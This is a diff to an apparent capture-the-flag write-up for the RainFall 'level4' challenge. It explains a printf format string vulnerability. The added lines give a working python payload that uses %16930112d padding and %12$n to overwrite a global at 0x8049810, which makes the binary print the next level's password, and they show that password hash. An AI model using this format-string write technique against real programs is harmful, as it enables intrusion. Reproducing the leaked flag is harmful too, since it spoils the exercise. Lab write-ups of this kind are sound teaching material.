@@ -1,4 +1,4 @@
-# SAME AS LEVEL3, PRINTF FORMAT STRING VULNERABILITY
+# SAME AS LEVEL3, PRINTF FORMAT STRING VULNERABILITY, BUT WITH A GIANT NUMBER TO WRITE (USE FORMAT SPECIFIER %Xd)
 
 ```
 080484a7 <main>:
@@ -54,8 +54,20 @@ $4 = 0x8048590 "/bin/cat /home/user/level5/.pass"
 The string at 0x8048590 is "/bin/cat /home/user/level5/.pass", so we need to make the value at 0x8049810 equal to 0x1025544 to get the flag.
 
 ```
-level4@RainFall:~$ ./level4
+~$ ./level4
 aaaa %p %p %p %p %p %p %p %p %p %p %p %p
 aaaa 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
 ```
-Like in level3, we first need to find the offset where the format string is located in the stack by printing the stack. The offset is 12
+Like in level3, we first need to find the offset where the format string is located in the stack by printing the stack. The offset is 12.
+
+Then we can use the %12$n format to write the value 0x1025544 to the address 0x8049810. The only problem is that we need to write 0x1025544 bytes (16930116), which is not possible since the buffer is shorter, but we can use the specifier %Xd to write X bytes.
+
+```
+~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/exploit4
+~$ cat /tmp/exploit4 | ./level4
+...
+   
+...
+                                                                                                                                                                                                                                                                             -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
